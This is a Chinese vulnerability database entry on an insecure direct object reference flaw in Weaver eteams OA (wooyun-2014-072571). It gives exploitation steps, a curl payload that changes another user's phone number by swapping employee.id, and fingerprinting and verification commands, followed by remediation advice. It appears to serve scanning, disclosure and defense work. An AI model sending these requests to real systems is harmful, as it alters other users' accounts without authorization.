---
id: WEAVER-ETEAMS-IDOR-USERINFO
title: 泛微 eteams OA 越权修改任意用户信息漏洞（wooyun-2014-072571）
product: weaver-oa
vendor: 泛微网络
version_affected: "泛微 eteams OA（2014 年披露版本）"
severity: MEDIUM
tags: [idor, 越权访问, 逻辑漏洞, 国产, eteams]
fingerprint: ["泛微", "weaver", "eteams", "eTeams", "/base/employee/saveProperty.json"]
---

## 漏洞描述

泛微 eteams OA 系统存在越权修改任意用户信息漏洞（wooyun-2014-072571，漏洞类型：非授权访问/权限绕过）。已登录的普通用户可通过 `/profile/summary/{id}.json` 获取其他用户 ID，随后调用 `/base/employee/saveProperty.json` 修改任意用户资料（如电话、邮箱），服务端未校验数据归属（IDOR/缺失对象级授权）。

**注意**：本条目是 eteams 的越权漏洞，与 E-Cology/E-cology10 的 SSRF、RCE 漏洞是不同产品线/不同漏洞，不要合并；"越权修改用户信息"不等于任意文件读取或 RCE。

## 影响版本

- 泛微 eteams OA（wooyun-2014-072571 披露时的版本；该平台为 SaaS/租户式 OA，历史版本已迭代）

## 前置条件

- 拥有一个普通用户账号（已登录）
- 目标为泛微 eteams OA

## 利用步骤

1. 登录普通用户账号，访问个人资料页
2. 抓包获取自己的用户 ID（如 `/profile/summary/{id}.json` 返回的 JSON 含用户 ID）
3. 修改资料（如电话），将请求中的 `employee.id` 替换为目标用户 ID
4. 若目标用户资料被修改，则存在越权

## Payload

```bash
# 目标用户 ID 通过 /profile/summary/{id}.json 或业务数据获取
curl -s -X POST "http://target/base/employee/saveProperty.json" \
  -H "Cookie: <登录态>" \
  --data-urlencode "employee.id=<目标用户ID>" \
  --data-urlencode "propertyName=telephone" \
  --data-urlencode "employee.telephone=test"
```

## 验证方法

```bash
# 1. 确认当前用户可访问自己的资料接口
curl -s "http://target/profile/summary/<自己的ID>.json?_=1" -H "Cookie: <登录态>"
# 2. 仅授权测试：将 employee.id 替换为目标用户 ID 后重放，观察目标资料被修改
```

## 指纹确认

```bash
curl -s "http://target/" | grep -iE "eteams|泛微|weaver"
# 或探测接口是否存在
curl -s -o /dev/null -w "%{http_code}" "http://target/base/employee/saveProperty.json"
```

## 修复建议

1. 服务端对资料修改接口增加对象级授权校验（校验 employee.id 归属）
2. 对所有以 ID 为入参的写操作统一校验数据归属
3. 对敏感字段（电话、邮箱）修改增加二次确认/审计

## 参考

- wooyun-2014-072571: https://wooyun.laolisafe.com/bug_detail.php?wybug_id=wooyun-2014-072571
- CN-SEC 转载: https://cn-sec.com/archives/23232.html
